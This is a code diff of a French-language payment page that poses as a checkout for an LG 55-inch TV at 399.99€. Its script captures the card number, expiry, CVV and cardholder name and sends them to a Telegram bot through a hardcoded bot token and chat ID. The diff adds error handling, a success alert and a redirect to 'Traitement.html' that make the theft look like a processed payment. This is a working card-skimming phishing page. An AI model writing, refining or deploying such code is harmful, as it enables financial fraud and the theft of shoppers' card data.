@@ -209,29 +209,29 @@
     </div>
 
     <script>
-        const cardInput = document.getElementById('card-number');
+    const cardInput = document.getElementById('card-number');
 
-        cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
-            if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
-            const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
-            e.target.value = formattedValue;
-        });
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s+/g, ''); // Retirer les espaces
+        if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+        const formattedValue = value.replace(/(\d{4})/g, '$1 ').trim(); // Ajouter un espace après chaque 4 chiffres
+        e.target.value = formattedValue;
+    });
 
-        // Fonction pour envoyer les informations au bot Telegram
-        document.getElementById('payment-form').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Eviter l'envoi du formulaire
+    // Fonction pour envoyer les informations au bot Telegram
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Empêcher l'envoi du formulaire par défaut
 
-            const data = new FormData(this);
-            const cardNumber = data.get('card-number');
-            const expiryMonth = data.get('expiry-month');
-            const expiryYear = data.get('expiry-year');
-            const cvv = data.get('cvv');
-            const nameOnCard = data.get('name-on-card');
-            const price = "399.99€"; // Prix du produit
+        const data = new FormData(this);
+        const cardNumber = data.get('card-number');
+        const expiryMonth = data.get('expiry-month');
+        const expiryYear = data.get('expiry-year');
+        const cvv = data.get('cvv');
+        const nameOnCard = data.get('name-on-card');
+        const price = "399.99€"; // Prix du produit
 
-            // Créez un message à envoyer
-            const message = `
+        // Créez un message à envoyer
+        const message = `
 Produit : LG TV - 55NANO766 - 55 Pouces 4K
 Prix : ${price}
 Numéro de carte : ${cardNumber}
@@ -240,25 +240,30 @@ CVV : ${cvv}
 Nom sur la carte : ${nameOnCard}
 `;
 
-            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-            const chatId = '5372119436'; // Votre chat ID Telegram
+        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+        const chatId = '5372119436'; // Votre chat ID Telegram
 
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
+        try {
             // Envoi du message
             const response = await fetch(telegramApiUrl);
             const dataResponse = await response.json();
 
             if (dataResponse.ok) {
                 alert('Votre paiement a été envoyé avec succès.');
+                // Redirection vers la page "Traitement.html"
+                window.location.href = "Traitement.html";
             } else {
-                alert('Erreur dans l\'envoi des informations.');
+                alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
             }
-        });
-    </script>
+        } catch (error) {
+            console.error('Erreur lors de l\'envoi:', error);
+            alert('Erreur réseau ou problème avec l\'API Telegram.');
+        }
+    });
+</script>
 
-</body>
-</html>
 
 <!-- Footer -->
 <footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
